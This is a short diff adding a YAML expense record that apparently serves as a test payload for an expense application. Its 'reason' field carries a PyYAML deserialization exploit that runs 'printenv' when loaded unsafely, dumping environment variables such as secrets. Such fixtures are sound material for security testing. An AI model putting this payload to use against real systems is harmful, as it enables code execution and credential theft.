@@ -1,0 +1,10 @@
+---
+expenses:
+  - expense:
+      name: PayTM Bill payment 3
+      reason: !!python/object/apply:subprocess.check_output ['printenv']
+      merchant: Hello World Traders
+      amount: 12.00
+      user_id: 10
+      project_id: 80
+      approved: no
